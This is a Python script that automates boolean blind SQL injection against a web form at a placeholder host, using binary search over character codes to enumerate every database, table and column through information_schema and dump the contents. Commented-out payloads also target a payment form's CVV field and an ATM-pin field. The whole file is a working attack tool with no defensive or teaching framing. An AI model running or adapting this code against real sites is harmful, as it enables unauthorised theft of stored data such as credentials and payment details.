# -*- coding: utf-8 -*-
"""
Created on Fri May  8 16:03:19 2020

@author: 0p71mu5
"""

import requests # install
from time import sleep
import re
import sys
from time import localtime, strftime
from datetime import datetime, date
import pandas # install
from tabulate import tabulate # install

def current_time(expression):
	if expression=='date':
		tme=strftime("%d-%m", localtime())
	elif expression=='time':
		tme=strftime("%H:%M:%S", localtime())
	elif expression=='date-time':
		tme=strftime("%Y-%m-%d %H:%M:%S", localtime())
	return tme

def log(file,data):
	f = open(file, 'a')
	f.write(str(data)+"\n")
	f.close

def empty_file(filename):
	f = open(filename, 'w')
	f.write('')
	f.close

def send_req(data_payload):
	error=0
	sleep(2)
	try:
		get_data=s.post('https://www.xyz.co/pay/', headers=header_payload, data=data_payload, allow_redirects=False, timeout=60)
		if get_data.status_code==302:
			return True
		else:
			return False
	except:
		print("[X] Exception occurred: - Sleeping for 10 secs.")
		log("error_log.txt"," data_payload: "+data_payload)
		error+=1
		sleep(10)
		if error>3:
			print("[X] 3 & more consecutive errors - Sleeping for 30 secs.")
			sleep(30)
# 	print("DEBUG: data_payload="+data_payload)
# 	print("DEBUG: Response Status Code - "+str(get_data.status_code))



def blind_sqli_fast(sqli_payload):
	l=0
	r=255
	for i in range(l, r):
		while l <= r:
			mid = l + (r - l)//2;
# 				print("DEBUG: l-"+str(l)+" m-"+str(mid)+" r-"+str(r))
# name=ass&cardno=0&cardexpiry=&cvv=ass'or '1'='1&submitcc=Pay+Now
			if send_req("agentcode=jobs'+and+ascii(substr("+sqli_payload+"))="+str(mid)+"+--+-&pwd=1&submit=register"):
				return chr(mid)
			elif send_req("agentcode=jobs'+and+ascii(substr("+sqli_payload+"))<"+str(mid)+"+--+-&pwd=1&submit=register"):
				r = mid - 1
			else:
				l = mid + 1
		return False
	return False

def blind_sqli(sqli_payload):
# 	error=0
	for i in range(0, 200):
		data_payload= "agentcode=jobs' and substr("+sqli_payload+")='"+str(i)+"' -- -&pwd=1&submit=register"
# 		data_payload= "__VIEWSTATE=%2FwEPDwUKLTc3Njc5Mzc2MWRkKJ0F7uS1dlDHBYmzEtC3dUXkK%2BXriojNbLe9ivqukLw%3D&__VIEWSTATEGENERATOR=D778CC74&__EVENTVALIDATION=%2FwEdAAWZqZ4%2Fk3cvJXlHKXQADSrx7hv76BH8vu7iM4tkb8en1REghZBVv0boc2NaC2%2FzVFQdp1z%2BnYWZ%2BpirZkxjR3dzP1jLJHiqNfRsonZfptdXU%2FRQqFE0JMafhoTIYQL75wJw1zitg4Z31yK6D8NlA2%2BJ&atmpin='+or+substr("+sqli_payload+")='"+chars[i]+"'+--+-&email=1234&phone=1234&submit=submit"
# 		print("DEBUG: "+str(i)+" : "+data_payload)
		if send_req(data_payload):
			return str(i)
		else:
			continue
	return False


def get_data(cmd,sqli_payload,table_name,db_name):

	print(" [i] Getting Total ROWS in OUTPUT")
	if cmd=="db":
		total_data_size=1
	elif cmd=="enum_dbs":
		sqli_len_payload= "select count(concat(schema_name)) FROM information_schema.schemata"
		total_data_size=blind_sqli("("+sqli_len_payload+" limit 0,1),1,1")
	elif cmd=='tables':
		sqli_len_payload= "select count(table_name) from information_schema.tables where table_schema='"+db_name+"'"
		total_data_size=blind_sqli("("+sqli_len_payload+" limit 0,1),1,1")
		if total_data_size==0:
			print("DATABASE "+db_name+" is empty.")
			return False
	elif cmd=='table_data':
		sqli_len_payload= "SELECT count(COLUMN_NAME) FROM information_schema.columns WHERE table_schema='"+db_name+"' AND table_name='"+table_name+"'"
		total_data_size=blind_sqli("("+sqli_len_payload+" limit 0,1),1,1")

	print("DEBUG:  - Total COLUMNS - "+str(total_data_size))

	output_all=[]
	for row in range(int(total_data_size)):
		print(" [i] Getting length of ROW"+str(row))

		if cmd=="db":
			sqli_len_payload="select length('"+db_name+"')"
			total_data_size=blind_sqli("("+sqli_len_payload+"),1,1")
		elif cmd=='enum_dbs':
			sqli_len_payload= "select length(concat(schema_name)) FROM information_schema.schemata"
			total_data_size=blind_sqli("("+sqli_len_payload+" limit "+str(row)+",1),1,1")
		elif cmd=='tables':
			sqli_len_payload= "select length(TABLE_NAME) from information_schema.tables where table_schema='"+db_name+"'"
			total_data_size=blind_sqli("("+sqli_len_payload+" limit "+str(row)+",1),1,1")
		elif cmd=='table_data':
			sqli_len_payload= "SELECT length(COLUMN_NAME) FROM information_schema.columns WHERE table_schema='"+db_name+"' AND table_name='"+table_name+"'"
			total_data_size=blind_sqli("("+sqli_len_payload+" limit "+str(row)+",1),1,1")
		print("DEBUG:  - Length of OUTPUT in ROW"+str(row)+" - "+str(total_data_size))

		output=''
		for pos in range(int(total_data_size)):
			pos+=1

			f = open("log.txt", 'r')
			data=f.read()
			f.close
			data=re.compile(r'Row : (.*?), Position: (.*?), Value').findall(data)

# 			if (str(row),str(pos)) in data:
			if False:
				print("DEBUG: [!] Row : "+str(row)+", Position: "+str(pos)+" - Already Processed, Skipping.")
			else:
# 				print("DEBUG: [i] Row : "+str(row)+", Position: "+str(pos))
				char_value=blind_sqli_fast("("+sqli_payload+" limit "+str(row)+",1),"+str(pos)+",1")
				if char_value!=False:
					print("	[+] Found - Row : "+str(row)+", Position: "+str(pos)+", Value: "+char_value)
					log("found.txt","Row : "+str(row)+", Position: "+str(pos)+", Value: "+char_value)
					log("log.txt","Row : "+str(row)+", Position: "+str(pos)+", Value")
					output+=char_value
				else:
					char_value='?'
					output+=char_value
		output_all.append(output)
		print("DEBUG: [+] ROW"+str(row)+" - "+output)
	return output_all

s=requests.Session()

header_payload={
		'Host': 'www.xyz.co',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'en-GB,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': '153',
		'Origin': 'https://www.xyz.co',
		'DNT': '1',
		'Connection': 'close',
		'Referer': 'https://www.xyz.co/login.php',
		'Cache-Control': 'no-cache'
	}

def get_db_data(db_name):

# 	op=get_data('db',"select database()",'')
# 	if db_name in op:
	print("Current DB - "+db_name)
	empty_file("log.txt")
	print("GETTING TABLES in DB: "+db_name)
	sqli_payload= "select table_name from information_schema.tables where table_schema='"+db_name+"'"
	table_names=get_data('tables',sqli_payload,'',db_name)

	if table_names==False:
		return
	else:
		print("TABLES:")
		for table in table_names:
		 	print("- "+table)

	# DEBUG
	# table_names=['admin', 'cust_data', 'txt_data']

	column_names=[]
	for table in table_names:
	# 	get_table_data(db_name,table)
	 	empty_file("log.txt")
	 	sqli_payload= "SELECT COLUMN_NAME FROM information_schema.columns WHERE table_schema='"+db_name+"' AND table_name='"+table+"'"
	 	output=get_data('table_data',sqli_payload,table,db_name)
	 	column_names.append(output)

	# DEBUG
	# column_names=[['ID', 'a','admin_pwd'],['ID'],['ID', 'c']]

	for i in range(0,len(table_names)):
		print("Table - "+table_names[i])
		for j in range(0,len(column_names[i])):
			print(" - "+column_names[i][j])

	data=['']*len(column_names)
	print("Getting Column Data: ")
	for i in range(0,len(table_names)):
		output_all=[]
		print("Fetching data from Table - "+table_names[i])
		for j in range(0,len(column_names[i])):
			print("-> Column - "+column_names[i][j])
			empty_file("log.txt")
			sqli_payload= "SELECT "+column_names[i][j]+" FROM "+db_name+"."+table_names[i]
			output=get_data('table_data',sqli_payload,table_names[i],db_name)
			output_all.append(output)
		data[i]=output_all

	# print(data)

	# DEBUG
	# data=[[['1\x00', '?', '?????????'], ['??', '?', '?????????'], ['30', '?', '?????????']], [['53']], [['16', '?'], ['??', '?']]]

	data_updated=data
	for i in range(0,len(table_names)):
	# 	print("DEBUG: Table - "+table_names[i])
		for j in range(0,len(column_names[i])):
			print("DEBUG: Column"+str(i+1)+" - "+column_names[i][j])
			for k in range(0,len(data[i][j])):
# 		 			print("DEBUG:  - "+data[i][k][j])
	 			data_updated[i][j][k]=data[i][k][j]

	print("Formatted Tables - ")
	for i in range(0,len(table_names)):
		print("\nTable Name- "+table_names[i])
		for j in range(0,len(column_names[i])):
			d = column_names[j]
		df = pandas.DataFrame(data=data_updated[i])
		df.columns = column_names[i]
		print(tabulate(df, headers='keys', tablefmt='psql'))




# start_time=current_time("date-time")
start_time=datetime.now()
print("Execution START Time: "+str(start_time))

empty_file("error.txt")
try:
 	get_phpsessid=s.get('https://www.xyz.co/', allow_redirects=True, timeout=60)
except:
# except requests.exceptions.ConnectionError as e:
 	print("[X] Exception occurred.")
 	sys.exit(1)

empty_file("log.txt")
print("GETTING List of DB Name")
sqli_payload= "SELECT concat(schema_name) FROM information_schema.schemata"
db_name_all=get_data('enum_dbs',sqli_payload,'','')
print("DATABASES FOUND -")
# for db in db_name_all:
#  	print(db)
df = pandas.DataFrame(data=db_name_all)
df.columns = ['DATABASES']
print(tabulate(df, headers='keys', tablefmt='psql'))

for db in db_name_all:
 	get_db_data(db)
# get_db_data('i')

# DEBUG
# db_name='db455'
# table_name='admin'
# table_name='cust_data'
# table_name='txt_data'

# empty_file("log.txt")
# print("GETTING DB Name")
# sqli_payload= "select database()"
# db_name=get_data('db',sqli_payload,'')
# print("DATABASE - "+db_name[0])




end_time = current_time("date-time")
end_time = datetime.now()
print("Execution END Time: "+str(end_time))


print("Total script execution time : "+str(end_time-start_time))